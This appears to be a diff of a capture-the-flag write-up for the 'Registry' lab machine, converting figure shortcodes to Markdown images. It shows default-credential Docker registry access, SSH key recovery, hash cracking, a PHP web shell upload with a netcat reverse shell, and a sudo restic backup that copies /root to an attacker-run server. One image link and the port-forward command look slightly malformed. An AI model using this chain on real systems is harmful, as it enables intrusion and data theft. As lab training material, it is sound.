@@ -53,14 +53,14 @@ Now that we've authenticated, we are given what seems to be an API endpoint. Sur
 
 According to the docks we can see available repositories by send a `GET` to `/v2/_catalog`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-19.png" caption="From the Docker documentation" >}}
+![](/images/2020/04/image-19.png" caption="From the Docker documentation)
 
 So, let's `curl` it and see what comes back (Note you can just browse to this URL as well).
 
 Command:
 `curl --user "admin:admin" docker.registry.htb/v2/_catalog`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-20.png" >}}
+![](/images/2020/04/image-20.png)
 
 We see one repo named `bolt-image`. Cool, now that we have an image being used, let's get it's manifest. For those unaware of Docker and how it functions, a manifest is just like it sounds. A listing of docker related data about the image being used. You can read more on the Docker manifest [here](https://docs.docker.com/engine/reference/commandline/manifest/).
 
@@ -82,26 +82,26 @@ wget --http-user=admin --http-password=admin http://docker.registry.htb/v2/bolt-
 
 We finally find one with some data in!
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-21.png" >}}
+![](/images/2020/04/image-21.png)
 
 Inside we have a shell file with the password to an `SSH` key.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-22.png" >}}
+![](/images/2020/04/image-22.png)
 
 Inside another, we have the key itself.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-23.png" >}}
+![](/images/2020/04/image-23.png)
 
 Inside the `config` file we also get a username to connect with.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-24.png" >}}
+![](/images/2020/04/image-24.png)
 
 Now we can `SSH` into the machine and with some luck snag our user key!
 
 Command:
 `ssh -i id_rsa bolt@10.10.10.159`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-26.png" >}}
+![](/images/2020/04/image-26.png)
 
 Awesome, we have our `user.txt` flag. Let's start enumerating and looking for a path to root!
 
@@ -109,18 +109,18 @@ We know from the `gobuster` enumeration that there is a directory called /bolt/ 
 
 We head back to our `SSH` shell and look around the bolt directory. We find a file called `bolt.db` in the bolt app location.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-27.png" >}}
+![](/images/2020/04/image-27.png)
 
 If we `cat` this file we see this within it.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-29.png" >}}
+![](/images/2020/04/image-29.png)
 
 That is indeed the hash for the admin account. We'll save it to a file called `admin.hash` and send it to `john` to crack.
 
 Command:
 `john --wordlist=/usr/share/wordlist/rockyou.txt admin.hash`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/adminhash_registry.gif" >}}
+![](/images/2020/04/adminhash_registry.gif)
 
 We get a password of `strawberry` back. So now that we have an admin password to the application, let's log in: `http://registry.htb/bolt/bolt/login`
 
@@ -128,7 +128,7 @@ Once we're in we look around internally as well as some googling for bolt cms ex
 
 So we head over to Configuration > Main Configuration and look for the `accepted_file_types` line.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-30.png" >}}
+![](/images/2020/04/image-30.png)
 
 Now we add `.php` to the list. Then we head over to File Management tab and upload our own shell. This all needs to be done quickly. It seems that the setting get reset every 2 mins or so?
 
@@ -136,11 +136,11 @@ So we upload our shell and navigate to it and execute our command for a netcat l
 
 We then connect to the target for our shell.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-31.png" >}}
+![](/images/2020/04/image-31.png)
 
 Once we're in we start some manual enumeration and get `linpeas` onto the system. Our first check of our permission shows that we can run `restic` as sudo.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-32.png" >}}
+![](/images/2020/04/image-32.png)
 
 I don't even know what the software is, so we do more googling. Turns out it's a backup application. Reading through the documentation it seems the calls are all local, meaning we'll need to forward our ports at some point. First let's install the application. The application is actually in the standard repo, so we can use `apt install restic` and be good.
 
@@ -150,37 +150,37 @@ After it's installed we need to initialize the repo:
 Next, we need to start the server. We can download the precompiled binaries [here](https://github.com/restic/rest-server/releases):
 `rest-server --path .reg`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-33.png" >}}
+![](/images/2020/04/image-33.png)
 
 Now that those parts are setup. We need to forward our ports in order to pass our commands.
 
 Command:
 `ssh -i ~/HTB/Registry/root/.ssh/id_rsa 8000:localhost:8000 bolt@10.10.10.159`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-34.png" >}}
+![](/images/2020/04/image-34.png)
 
 Now we can issue the sync command from the `www-data` shell:
 `sudo /usr/bin/restic backup -r rest:http://localhost:8000 /root`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-35.png" >}}
+![](/images/2020/04/image-35.png)
 
 We will now see our `.reg` location filled with data from the backup.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-36.png" >}}
+![](/images/2020/04/image-36.png)
 
 This isn't exactly what we want. Although I'm sure we could dig through the snapshot file, we want to sync the `root.txt` flag. So we can issue the same basic command as above but to specify the `root.txt` file:
 
 Command:
 `sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root/root.txt`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-37.png" >}}
+![](/images/2020/04/image-37.png)
 
 Now that we've copied that file back, we need to decrypt it using the `restore` function of `restic`. We need to go back a level because this will not work from within the repo.
 
 Command:
 `restic -r .reg restore latest --target restored`
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/rootregistry.gif" >}}
+![](/images/2020/04/rootregistry.gif)
 
 There we have it, our `root.txt` flag! Also, I should note that restoring the snapshot file was not complicated and did it the second time through the box for this blog. Here are the steps.
 
